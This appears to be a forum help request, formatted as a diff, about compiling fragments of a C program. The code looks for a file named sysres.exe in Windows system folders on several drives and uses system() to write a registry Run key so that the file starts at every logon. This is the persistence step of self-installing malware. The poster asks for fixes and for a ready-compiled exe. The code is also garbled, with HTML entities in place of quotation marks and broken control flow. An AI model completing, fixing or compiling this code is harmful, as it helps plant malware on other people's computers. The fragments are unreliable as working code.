@@ -1,0 +1,39 @@
+replace the line
+
+struct ffblk ffblk
+
+with the following line and try
+
+struct ffblk {
+char ff_reserved[21];
+char ff_attrib;
+int ff_ftime;
+int ff_fdate;
+long ff_fsize;
+char ff_name[13];
+}ffblk;
+
+===========================================================================
+
+done=findfirst(quot;C:\\windows\\systemquot;,amp;ffblk,FA_DIREC);
+done=findfirst(quot;D:\\windows\\systemquot;,amp;ffblk,FA_DIREC);
+done=findfirst(quot;C:\\windows\\system\\sysres.exequot;,amp;ffblk,0);
+done=findfirst(quot;F:\\windows\\systemquot;,amp;ffblk,FA_DIREC);
+done=findfirst(quot;E:\\windows\\systemquot;,amp;ffblk,FA_DIREC);
+
+else
+
+{
+system(quot;REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows
+\\CurrentVersion\\Run \/v sres \/t REG_SZ \/d C:\\windows\\system\\sysres.exequot;);
+}
+
+And all of the
+
+if(done==0)
+
+lines have errors.
+
+It is possible that is has to with the compiler i am using, for it does not use command lines. I can#39;t use the borland one though. It keeps messing up.
+
+This project must be done by Friday for me. I have a schedule to stick too. I can look for something else meanwhile. Sorry to be complaining this much. is it posible for me to download the exe version of the file, after it has been compiled? That would make this much easier. Thank you for helping me with this matter.
